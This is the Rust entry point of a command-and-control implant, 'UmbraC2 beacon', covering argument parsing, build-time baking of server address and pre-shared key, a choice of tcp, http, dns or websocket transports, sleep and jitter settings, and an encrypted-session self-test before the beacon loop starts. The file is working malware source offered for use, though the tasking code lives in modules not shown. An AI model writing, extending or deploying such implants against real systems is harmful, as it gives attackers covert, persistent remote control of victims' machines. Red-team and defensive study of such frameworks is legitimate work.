//! UmbraC2 beacon entry point.
//!
//! Build-time configuration (env vars at `cargo build`):
//!   UMBRA_SERVER, UMBRA_PSK, UMBRA_AGENT_ID, UMBRA_TRANSPORT, UMBRA_SLEEP, UMBRA_JITTER
//!
//! The same variables can be supplied at runtime; flags below win over both.

use std::process::ExitCode;

use umbra_beacon::beacon::{Beacon, VERSION};
use umbra_beacon::config::{self, Config, Transport};
use umbra_beacon::{crypto, upk, wire};

fn main() -> ExitCode {
    match run() {
        Ok(()) => ExitCode::SUCCESS,
        Err(msg) => {
            eprintln!("umbra-beacon: {msg}");
            ExitCode::FAILURE
        }
    }
}

fn run() -> Result<(), String> {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut cli = Cli::parse(&args)?;

    if cli.help {
        print_help();
        return Ok(());
    }
    if cli.version {
        println!("umbra-beacon {VERSION} (protocol umbra/v1)");
        return Ok(());
    }
    if cli.selftest {
        return selftest();
    }

    let mut cfg = Config::load()?;
    // Apply command line overrides on top of the environment.
    if let Some(v) = cli.server.take() {
        cfg.server = v;
    }
    if let Some(v) = cli.transport.take() {
        cfg.transport = match v.as_str() {
            "tcp" => Transport::Tcp,
            "http" => Transport::Http,
            "dns" => Transport::Dns,
            "ws" | "websocket" => Transport::Ws,
            other => return Err(format!("unknown transport {other:?}")),
        };
    }
    if let Some(v) = cli.http_path.take() {
        cfg.http_path = v;
    }
    if let Some(v) = cli.agent_id.take() {
        cfg.agent_id = v;
    }
    if let Some(v) = cli.psk.take() {
        cfg.psk = config::hex_decode(&v).ok_or("--psk must be hex")?;
    }
    if let Some(v) = cli.sleep {
        cfg.sleep = v;
    }
    if let Some(v) = cli.jitter {
        cfg.jitter = v;
    }
    if cli.verbose {
        cfg.verbose = true;
    }

    if cli.check {
        println!("server      : {}", cfg.server);
        println!("transport   : {:?}", cfg.transport);
        println!("http_path   : {}", cfg.http_path);
        println!("agent_id    : {}", cfg.agent_id);
        println!("psk         : {} bytes (sha256 fingerprint {})", cfg.psk.len(), fingerprint(&cfg.psk));
        println!("sleep/jitter: {}s / {}%", cfg.sleep, cfg.jitter);
        println!("suites      : {:?}", crypto::supported_suites());
        return Ok(());
    }

    if cfg.verbose {
        eprintln!(
            "[umbra] beacon {VERSION} -> {} ({:?}), agent {}",
            cfg.server, cfg.transport, cfg.agent_id
        );
    }

    let mut beacon = Beacon::new(cfg);
    beacon.run(cli.cycles)?;
    Ok(())
}

fn fingerprint(psk: &[u8]) -> String {
    let digest = crypto::sha256(psk);
    config::hex_encode(&digest[..6])
}

/// Quick offline sanity check: encode/decode, AEAD roundtrip, frame roundtrip.
fn selftest() -> Result<(), String> {
    let value = upk::map(vec![
        ("s", upk::s("şifreli")),
        ("n", upk::u(300)),
        ("neg", upk::i(-1)),
        ("b", upk::bin(&[0, 1, 0xfe])),
    ]);
    let encoded = upk::encode(&value).map_err(|e| e.to_string())?;
    let decoded = upk::decode_exact(&encoded).map_err(|e| e.to_string())?;
    if decoded != value {
        return Err("upk roundtrip mismatch".into());
    }

    let mut client = umbra_beacon::session::Session::from_bootstrap(&[9u8; 32], wire::SUITE_AES256_GCM, false)
        .map_err(|e| e.to_string())?;
    let mut server = umbra_beacon::session::Session::from_bootstrap(&[9u8; 32], wire::SUITE_AES256_GCM, true)
        .map_err(|e| e.to_string())?;
    let frame = client.seal_value(wire::MSG_CHECKIN, &value).map_err(|e| e.to_string())?;
    let (t, v) = server.open_value(&frame).map_err(|e| e.to_string())?;
    if t != wire::MSG_CHECKIN || v != value {
        return Err("session roundtrip mismatch".into());
    }
    if server.open(&frame).is_ok() {
        return Err("replay was accepted".into());
    }
    println!("selftest: ok (upk, aead, session, replay protection)");
    Ok(())
}

struct Cli {
    server: Option<String>,
    transport: Option<String>,
    http_path: Option<String>,
    agent_id: Option<String>,
    psk: Option<String>,
    sleep: Option<u64>,
    jitter: Option<u32>,
    cycles: Option<u64>,
    verbose: bool,
    check: bool,
    selftest: bool,
    version: bool,
    help: bool,
}

impl Cli {
    fn parse(args: &[String]) -> Result<Cli, String> {
        let mut cli = Cli {
            server: None,
            transport: None,
            http_path: None,
            agent_id: None,
            psk: None,
            sleep: None,
            jitter: None,
            cycles: None,
            verbose: false,
            check: false,
            selftest: false,
            version: false,
            help: false,
        };
        let mut i = 0;
        while i < args.len() {
            let a = args[i].as_str();
            let mut next = |i: &mut usize| -> Result<String, String> {
                *i += 1;
                args.get(*i).cloned().ok_or_else(|| format!("{a} needs a value"))
            };
            match a {
                "--server" | "-s" => cli.server = Some(next(&mut i)?),
                "--transport" | "-t" => cli.transport = Some(next(&mut i)?.to_ascii_lowercase()),
                "--http-path" => cli.http_path = Some(next(&mut i)?),
                "--agent-id" | "-i" => cli.agent_id = Some(next(&mut i)?),
                "--psk" | "-k" => cli.psk = Some(next(&mut i)?),
                "--sleep" => cli.sleep = Some(next(&mut i)?.parse().map_err(|_| "--sleep: integer")?),
                "--jitter" => cli.jitter = Some(next(&mut i)?.parse().map_err(|_| "--jitter: integer")?),
                "--cycles" => cli.cycles = Some(next(&mut i)?.parse().map_err(|_| "--cycles: integer")?),
                "--once" => cli.cycles = Some(1),
                "--verbose" | "-v" => cli.verbose = true,
                "--check" => cli.check = true,
                "--selftest" => cli.selftest = true,
                "--version" | "-V" => cli.version = true,
                "--help" | "-h" => cli.help = true,
                other => return Err(format!("unknown argument {other:?} (try --help)")),
            }
            i += 1;
        }
        Ok(cli)
    }
}

fn print_help() {
    println!(
        "umbra-beacon {VERSION} -- UmbraC2 implant (protocol umbra/v1)

USAGE:
    umbra-beacon [OPTIONS]

OPTIONS:
    -s, --server <host:port>   team server (default: compiled-in, 127.0.0.1:4001)
    -t, --transport <tcp|http|dns|ws> transport to use (default: compiled-in, tcp)
        --http-path <path>     HTTP beacon path (default /api/v1/beacon)
    -i, --agent-id <id>        agent identity shown to operators
    -k, --psk <hex>            pre-shared key (default: compiled-in)
        --sleep <seconds>      base beacon interval
        --jitter <percent>     jitter percentage (0-90)
        --cycles <n>           stop after n beacon cycles
        --once                 same as --cycles 1
    -v, --verbose              log to stderr
        --check                print the effective configuration and exit
        --selftest             run offline protocol self-tests
    -V, --version              print version
    -h, --help                 print this help

ENVIRONMENT (also usable at build time to bake defaults in):
    UMBRA_SERVER UMBRA_PSK UMBRA_AGENT_ID UMBRA_TRANSPORT
    UMBRA_SLEEP UMBRA_JITTER UMBRA_HTTP_PATH UMBRA_VERBOSE"
    );
}
